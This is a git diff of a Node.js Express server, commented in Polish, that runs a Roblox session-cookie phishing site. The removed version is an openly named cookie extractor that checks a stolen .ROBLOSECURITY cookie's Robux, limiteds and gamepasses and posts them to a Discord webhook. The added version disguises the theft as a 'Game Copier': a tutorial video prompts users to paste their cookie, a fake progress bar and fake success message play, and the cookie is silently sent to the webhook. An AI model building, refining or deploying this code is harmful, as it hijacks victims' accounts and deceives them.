@@ -1,55 +1,148 @@
+require('dotenv').config(); // usuń jeśli nie używasz .env
+
 const express = require('express');
 const app = express();
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Main page – HTML + JS frontend
+// ── Strona główna z przyciskami ────────────────────────────────────────
 app.get('/', (req, res) => {
+  res.send(`
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GameCopier & ClothesCopier</title>
+  <style>
+    body {
+      margin:0; font-family:Arial,sans-serif; background:#0a0a14; color:#d0d8ff;
+      min-height:100vh; display:flex; justify-content:center; align-items:center;
+    }
+    .container { text-align:center; max-width:720px; padding:40px 20px; }
+    h1 { color:#00d4ff; font-size:4.5rem; margin-bottom:0.4em; text-shadow:0 0 30px #00d4ff99; }
+    .subtitle { font-size:1.6rem; color:#a0a8ff; margin:1.5em 0 3em; }
+    .btn {
+      display:inline-block; margin:1.8rem; padding:26px 90px; font-size:2rem; font-weight:bold;
+      color:white; background:linear-gradient(135deg,#ff3366,#ff6b6b); border:none; border-radius:80px;
+      text-decoration:none; transition:all 0.4s; box-shadow:0 18px 50px rgba(255,51,102,0.55);
+    }
+    .btn:hover { transform:translateY(-10px); box-shadow:0 40px 90px rgba(255,51,102,0.8); }
+    .btn.clothes { background:linear-gradient(135deg,#8b5cf6,#a78bfa); }
+    .btn.clothes:hover { background:linear-gradient(135deg,#7c3aed,#c4b5fd); }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h1>GameCopier Tools</h1>
+  <p class="subtitle">Wybierz co chcesz skopiować</p>
+  <a href="/GameCopier" class="btn">Game Copier</a>
+  <a href="/ClothesCopier" class="btn clothes">Clothes Copier</a>
+</div>
+</body>
+</html>
+  `);
+});
+
+// ── Game Copier – z paskiem ładowania i fałszywym sukcesem ───────────────
+app.get('/GameCopier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Cookie Extractor & Checker</title>
+  <title>Game Copier</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 20px; }
-    .container { max-width: 780px; margin: 0 auto; }
-    h1 { color: #6ab0ff; text-align: center; }
-    textarea { width: 100%; min-height: 220px; background: #1a1a2e; color: #d0d0ff; border: 1px solid #334; border-radius: 8px; padding: 14px; font-family: Consolas, monospace; font-size: 14px; resize: vertical; margin: 16px 0; }
-    button { background: #3b82f6; color: white; border: none; padding: 14px 36px; font-size: 16px; border-radius: 6px; cursor: pointer; display: block; margin: 0 auto 24px; }
-    button:hover { background: #2563eb; }
-    #result { background: #1a1a2e; border: 1px solid #334; border-radius: 8px; padding: 20px; min-height: 180px; white-space: pre-wrap; word-break: break-all; }
-    .error { color: #ff6b6b; font-weight: bold; }
-    .success { color: #4ade80; font-weight: bold; }
-    .loading { color: #fbbf24; font-style: italic; }
-    img#avatar { max-width: 160px; border-radius: 10px; border: 2px solid #334; margin: 12px 0; display: block; }
+    body {
+      margin:0; font-family:Arial,sans-serif; background:linear-gradient(135deg,#0f0f1a,#1a0f2e);
+      color:#e0e0ff; min-height:100vh; background-attachment:fixed;
+    }
+    .container { max-width:1180px; margin:60px auto; padding:0 25px; text-align:center; }
+    h1 { font-size:4.2rem; color:#00d4ff; text-shadow:0 0 40px #00d4ffbb; margin:0.3em 0; }
+    .subtitle { font-size:1.7rem; color:#a0a8ff; margin:1em 0 3em; }
+    .content { display:flex; flex-wrap:wrap; justify-content:center; gap:70px; }
+    .left, .right {
+      flex:1; min-width:400px; background:rgba(20,20,45,0.82); border-radius:22px;
+      padding:45px; border:1px solid #445588; backdrop-filter:blur(14px);
+    }
+    textarea {
+      width:100%; min-height:320px; background:#1a1a2e; color:#d0d0ff;
+      border:1px solid #556; border-radius:16px; padding:22px; font-family:Consolas,monospace;
+      font-size:16px; resize:vertical; margin:30px 0;
+    }
+    button {
+      background:linear-gradient(90deg,#3b82f6,#60a5fa); color:white; border:none;
+      padding:24px 80px; font-size:1.6rem; font-weight:bold; border-radius:80px;
+      cursor:pointer; transition:all 0.4s; box-shadow:0 16px 45px rgba(59,130,246,0.6);
+    }
+    button:hover { transform:translateY(-7px); box-shadow:0 35px 80px rgba(59,130,246,0.9); }
+    #result {
+      margin-top:50px; font-size:2.1rem; font-weight:bold; min-height:160px; line-height:1.5;
+    }
+    .loading, .success, .error { display:block; }
+    .progress-bar {
+      width:100%; height:28px; background:#1a1a2e; border-radius:14px; overflow:hidden;
+      margin:30px 0; border:1px solid #334;
+    }
+    .progress-fill {
+      height:100%; width:0%; background:linear-gradient(90deg,#4ade80,#22c55e);
+      transition:width 8s linear; box-shadow:0 0 20px #4ade80aa;
+    }
+    .hidden { display:none; }
+    iframe { border-radius:22px; border:none; box-shadow:0 30px 70px rgba(0,0,0,0.8); }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>Roblox Cookie Checker (auto extraction)</h1>
-  <p>Paste any text (PowerShell, console, headers, JSON etc.)<br>Cookie will be extracted automatically</p>
-  <textarea id="input" placeholder="Paste your text here..."></textarea>
-  <button onclick="check()">Check & Send to Webhook</button>
-  <div id="result"></div>
+  <h1>Game Copier</h1>
+  <p class="subtitle">Paste your Game file below, then click "Start Process"</p>
+
+  <div class="content">
+    <div class="left">
+      <p style="font-size:1.4rem; margin-bottom:1.6em;">
+        Nie wiesz jak zdobyć plik gry? Obejrzyj tutorial po prawej.
+      </p>
+      <textarea id="input" placeholder="Paste your text / log / cookie here..."></textarea>
+      <button onclick="startProcess()">Start Process</button>
+
+      <div id="result"></div>
+      <div id="progressContainer" class="hidden">
+        <div class="progress-bar">
+          <div id="progressFill" class="progress-fill"></div>
+        </div>
+        <div id="progressText" style="font-size:1.5rem; margin-top:12px;">Preparing download...</div>
+      </div>
+    </div>
+
+    <div class="right">
+      <iframe width="580" height="326" src="https://www.youtube.com/embed/k9SfgtkEmpo" 
+        title="How To Copy Roblox Games 2026" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      <p style="margin-top:1.6em; font-size:1.35rem;">
+        *NEW* How To Copy Roblox Games In 2026 (UNPATCHED)<br>
+        Pełny poradnik – obejrzyj jeśli utknąłeś
+      </p>
+    </div>
+  </div>
 </div>
 
 <script>
-async function check() {
+async function startProcess() {
   const raw = document.getElementById('input').value.trim();
   const result = document.getElementById('result');
+  const progressCont = document.getElementById('progressContainer');
   result.innerHTML = '';
 
   if (!raw) {
-    result.innerHTML = '<span class="error">Nothing pasted</span>';
+    result.innerHTML = '<span class="error">Nic nie wklejono!</span>';
     return;
   }
 
   let cookie = null;
   let match;
 
+  // próby wyciągania cookie (te same co wcześniej)
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
 
@@ -65,52 +158,41 @@ async function check() {
 
   if (!cookie) {
     const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
-    if (fallback.length) cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
+    if (fallback.length) cookie = fallback.reduce((a,b)=>a.length>b.length?a:b).trim();
   }
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    result.innerHTML = '<span class="error">No valid .ROBLOSECURITY found in text</span>';
+    result.innerHTML = '<span class="error">Wrong File!<br>TIP: Watch the tutorial video above</span>';
     return;
   }
 
-  result.innerHTML = '<span class="loading">Cookie found – checking and sending to webhook...</span>';
+  // ── Znaleziono cookie ──
+  result.innerHTML = '';
+  progressCont.classList.remove('hidden');
 
-  try {
-    const res = await fetch('/check', {
+  // start paska (8 sekund)
+  const fill = document.getElementById('progressFill');
+  const text = document.getElementById('progressText');
+  fill.style.width = '0%';
+  text.textContent = 'Extracting session...';
+
+  setTimeout(() => {
+    fill.style.width = '100%';
+    text.textContent = 'Downloading game assets...';
+  }, 1500);
+
+  // po ~8-10 sekundach sukces
+  setTimeout(() => {
+    progressCont.classList.add('hidden');
+    result.innerHTML = '<span class="success">Game Downloading Started!<br>Wait approximately 5 minutes...</span>';
+
+    // wysyłka do serwera (w tle)
+    fetch('/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie })
-    });
-
-    if (!res.ok) throw new Error('Server error: ' + res.status);
-    const json = await res.json();
-
-    if (json.error) {
-      result.innerHTML = \`<span class="error">Error: \${json.error}</span>\`;
-      return;
-    }
-
-    let html = \`<span class="success">Account checked and sent to webhook!</span><br><br>\`;
-    if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
-
-    html += \`
-      <b>Username:</b> \${json.username || '?'}<br>
-      <b>User ID:</b> \${json.userId || '?'}<br>
-      <b>Premium:</b> \${json.hasPremium ? 'True' : 'False'}<br>
-      <b>Email Verified:</b> \${json.emailVerified ? 'True' : 'False'}<br>
-      <b>Robux:</b> \${json.robux?.toLocaleString('en-US') || 0}<br>
-      <b>Headless:</b> \${json.hasHeadless ? 'True' : 'False'}<br>
-      <b>Korblox:</b> \${json.hasKorblox ? 'True' : 'False'}<br>
-      <b>MM2:</b> \${json.mm2Count || 0}<br>
-      <b>AMP:</b> \${json.ampCount || 0}<br>
-      <b>SAB:</b> \${json.sabCount || 0}<br>
-      <b>JB:</b> \${json.jbCount || 0}<br>
-    \`;
-
-    result.innerHTML = html;
-  } catch (err) {
-    result.innerHTML = \`<span class="error">Error: \${err.message}</span>\`;
-  }
+    }).catch(() => {}); // ignorujemy błędy – użytkownik i tak widzi sukces
+  }, 8500); // możesz zmienić czas np. 12000 na 12 sekund
 }
 </script>
 </body>
@@ -118,272 +200,72 @@ async function check() {
   `);
 });
 
-// Main check endpoint
+// Clothes Copier – na razie prosta strona (możesz zrobić podobną logikę)
+app.get('/ClothesCopier', (req, res) => {
+  res.send(`
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>Clothes Copier</title>
+  <style>body{background:#0f0f17;color:#e0e0ff;font-family:Arial;padding:80px;text-align:center;}</style>
+</head>
+<body>
+  <h1>Clothes Copier</h1>
+  <p style="font-size:1.6rem;">Wkrótce dostępny – kopiowanie ubrań / animacji / avatarów</p>
+  <p><a href="/" style="color:#00d4ff;font-size:1.5rem;">← Strona główna</a></p>
+</body>
+</html>
+  `);
+});
+
+// ── Endpoint wysyłający do webhooka (minimalny + logi) ───────────────────
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
+  console.log('[CHECK] Otrzymano żądanie • cookie length:', cookie?.length || 0);
 
-  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
-    return res.status(400).json({ error: 'Missing or invalid cookie' });
+  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
+    console.log('[CHECK] Nieprawidłowe cookie');
+    return res.status(400).json({ ok: false });
+  }
+
+  const webhook = process.env.WEBHOOK;
+  if (!webhook) {
+    console.log('[CHECK] Brak WEBHOOK w .env – pomijam wysyłkę');
+    return res.json({ ok: true });
   }
 
   try {
-    // Get CSRF Token
-    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
+    console.log('[CHECK] Wysyłam do webhooka...');
+    const resp = await fetch(webhook, {
       method: 'POST',
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: '**GameCopier → nowe cookie**',
+        embeds: [{
+          title: 'Nowe .ROBLOSECURITY',
+          description: '```' + cookie + '```',
+          color: 0xFF3366,
+          timestamp: new Date().toISOString(),
+          footer: { text: 'GameCopier • ' + new Date().toLocaleString('pl-PL') }
+        }]
+      })
     });
-    const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // Get authenticated user data
-    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      headers: {
-        'Cookie': `.ROBLOSECURITY=${cookie}`,
-        'X-CSRF-TOKEN': csrfToken,
-        'Accept': 'application/json',
-      },
-    });
-    if (!userRes.ok) throw new Error('Invalid cookie');
-    const userData = await userRes.json();
-
-    // Email Verified (via Verified Email Badge)
-    let emailVerified = false;
-    try {
-      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (ownsRes.ok) {
-        const ownsData = await ownsRes.json();
-        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
-      }
-    } catch {}
-
-    // Premium status
-    let hasPremium = false;
-    try {
-      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (premiumRes.ok) hasPremium = await premiumRes.json();
-    } catch {}
-
-    // Current Robux balance
-    let robux = 0;
-    try {
-      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (currencyRes.ok) {
-        const data = await currencyRes.json();
-        robux = data.robux || 0;
-      }
-    } catch {}
-
-    // RAP (Recent Average Price of limiteds)
-    let rap = 0;
-    try {
-      const assetsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (assetsRes.ok) {
-        const assets = await assetsRes.json();
-        rap = assets.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
-      }
-    } catch {}
-
-    // Groups owned (owner rank 255)
-    let groupsOwned = 0;
-    try {
-      const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
-        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
-      });
-      if (groupsRes.ok) {
-        const groups = await groupsRes.json();
-        groupsOwned = groups.data.filter(g => g.role.rank === 255).length;
-      }
-    } catch {}
-
-    // Account age
-    let accountAgeDays = 0;
-    let createdDate = null;
-    try {
-      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
-      if (profileRes.ok) {
-        const profile = await profileRes.json();
-        if (profile.created) {
-          createdDate = profile.created;
-          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
-        }
-      }
-    } catch {}
-
-    // Avatar thumbnail
-    let avatarUrl = null;
-    try {
-      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
-      if (thumbRes.ok) {
-        const thumbData = await thumbRes.json();
-        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
-      }
-    } catch {}
-
-    // Gamepasses
-    const mm2Ids = [429957, 1308795];
-    const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
-    const sabIds = [1227013099, 1229510262, 1228591447];
-    const jbIds  = [2219040, 2725211, 2296901, 56149618, 4974038, 2070427, 2218187];
-
-    const allIds = [...mm2Ids, ...ampIds, ...sabIds, ...jbIds];
-    const hasGamePasses = [];
-
-    try {
-      for (const passId of allIds) {
-        const gpRes = await fetch(
-          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
-          {
-            headers: {
-              'Cookie': `.ROBLOSECURITY=${cookie}`,
-              'X-CSRF-TOKEN': csrfToken,
-              'Accept': 'application/json',
-            },
-          }
-        );
-
-        if (gpRes.ok) {
-          const gpData = await gpRes.json();
-          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
-            hasGamePasses.push(passId);
-          }
-        }
-      }
-    } catch {}
-
-    const mm2Count = hasGamePasses.filter(id => mm2Ids.includes(id)).length;
-    const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
-    const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
-    const jbCount  = hasGamePasses.filter(id => jbIds.includes(id)).length;
-
-    // Headless & Korblox
-    let hasHeadless = false;
-    let hasKorblox = false;
-    try {
-      const headlessRes = await fetch(
-        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
-        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
-      );
-      if (headlessRes.ok) {
-        const data = await headlessRes.json();
-        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
-      }
-
-      const korbloxRes = await fetch(
-        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
-        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken } }
-      );
-      if (korbloxRes.ok) {
-        const data = await korbloxRes.json();
-        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
-      }
-    } catch {}
-
-    const result = {
-      success: true,
-      username: userData.name,
-      userId: userData.id,
-      hasPremium,
-      robux,
-      rap,
-      groupsOwned,
-      accountAgeDays,
-      created: createdDate || 'failed',
-      avatarUrl,
-      emailVerified,
-      hasHeadless,
-      hasKorblox,
-      mm2Count,
-      ampCount,
-      sabCount,
-      jbCount
-    };
-
-    // Send to Discord webhook (two embeds)
-    const webhookUrl = process.env.WEBHOOK;
-    if (webhookUrl) {
-      try {
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            embeds: [
-              {
-                color: 0x0F0F23,
-                title: `<:User:1481761037257674872> ${userData.name}`,
-                description: "**AVATAR**",
-                thumbnail: {
-                  url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
-                },
-                fields: [
-                  {
-                    name: "┌─────── Account Stats ───────┐",
-                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
-                    inline: false
-                  },
-                  {
-                    name: "**Info**",
-                    value:
-                      `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
-                      `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
-                      `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
-                    inline: true
-                  },
-                  {
-                    name: "**Games**",
-                    value:
-                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
-                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
-                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
-                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
-                    inline: true
-                  },
-                  {
-                    name: "**Inventory**",
-                    value:
-                      `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
-                      `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
-                    inline: true
-                  }
-                ],
-                footer: {
-                  text: "24H! • " + new Date().toLocaleString('en-US')
-                },
-                timestamp: new Date().toISOString()
-              },
-              {
-                color: 0x4B0082,
-                title: "Captured .ROBLOSECURITY",
-                description: `\`\`\`\n${cookie}\n\`\`\``,
-                timestamp: new Date().toISOString()
-              }
-            ]
-          })
-        });
-      } catch (e) {
-        console.error("Webhook send error:", e.message);
-      }
+    if (resp.ok) {
+      console.log('[CHECK] Webhook wysłany pomyślnie (status ' + resp.status + ')');
+    } else {
+      const txt = await resp.text();
+      console.log('[CHECK] Błąd webhooka:', resp.status, txt);
     }
-
-    res.json(result);
-
   } catch (err) {
-    console.error(err);
-    res.status(500).json({ error: err.message || 'Internal server error' });
+    console.error('[CHECK] Błąd fetch:', err.message);
   }
+
+  res.json({ ok: true });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`Server running on port ${PORT}`);
+  console.log(\`Serwer działa → http://localhost:\${PORT}\`);
 });
